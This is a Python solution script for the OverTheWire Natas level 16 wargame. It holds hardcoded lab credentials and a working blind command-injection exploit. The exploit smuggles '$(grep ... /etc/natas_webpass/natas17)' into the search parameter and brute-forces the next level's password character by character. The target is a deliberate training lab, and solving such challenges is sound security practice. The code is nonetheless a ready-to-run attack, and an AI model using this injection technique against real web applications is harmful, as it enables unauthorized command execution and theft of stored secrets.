import requests
import string
import base64

def build_password():
    letters = string.printable
    # an entry point found by sending ad-hoc requests
    tmp = "A"

    while(len(tmp) < 32):
        for letter in letters:
            if is_subpassword(letter + tmp):
                print("added " + letter + " to " + tmp)
                tmp = letter + tmp
                break
            elif is_subpassword(tmp + letter):
                print("added " + tmp + " to " + letter)
                tmp = tmp + letter
                break
    return tmp

def is_subpassword(suggestion):
    auth_key = "Basic " + base64.b64encode(b"natas16:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh").decode("utf-8")
    result = requests.post("http://natas16.natas.labs.overthewire.org/index.php", 
                            headers={"Authorization": auth_key}, 
                            params={"submit": "Search", "needle": "sonatas$(grep " + suggestion + " /etc/natas_webpass/natas17)"})
    #print(result.text)
    return suggestion not in string.punctuation and "<pre>\n</pre>" in result.text

print(build_password())
